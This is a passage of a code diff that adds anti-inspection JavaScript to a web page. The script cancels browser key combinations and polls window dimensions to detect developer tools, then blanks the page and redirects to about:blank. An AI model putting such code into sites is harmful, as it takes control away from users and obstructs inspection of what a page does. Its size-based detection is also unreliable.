+                } // Shift+F5
+            ];
+            // Check if current key combination is blocked
+            const isBlocked = blockedCombinations.some(combo => {
+                return (
+                    e.key.toUpperCase() === combo.key
+                        .toUpperCase() &&
+                    (combo.ctrl === undefined || combo
+                        .ctrl === e.ctrlKey) &&
+                    (combo.shift === undefined || combo
+                        .shift === e.shiftKey) &&
+                    (combo.meta === undefined || combo
+                        .meta === e.metaKey) &&
+                    (combo.alt === undefined || combo
+                        .alt === e.altKey)
+                );
+            });
+            if (isBlocked) {
+                e.preventDefault();
+                e.stopPropagation();
+                e.stopImmediatePropagation();
+                return false;
+            }
+        });
+        // Extra protection against opening devtools
+        let devtoolsOpen = false;
+        const devtoolsCheck = () => {
+            const widthThreshold = window.outerWidth - window.innerWidth >
+                160;
+            const heightThreshold = window.outerHeight - window
+                .innerHeight > 160;
+            const orientation = widthThreshold ? 'vertical' : 'horizontal';
+            if (!(heightThreshold && widthThreshold) &&
+                ((window.Firebug && window.Firebug.chrome && window.Firebug
+                    .chrome.isInitialized) ||
+                    widthThreshold || heightThreshold)) {
+                devtoolsOpen = true;
+                document.body.innerHTML =
+                    '<h1 style="text-align:center;margin-top:20%">Developer tools are disabled</h1>';
+                window.location.href = 'about:blank';
+            }
+        };
+        // Check periodically
+        setInterval(devtoolsCheck, 1000);
+    </script>
+</body>
+
+</html>
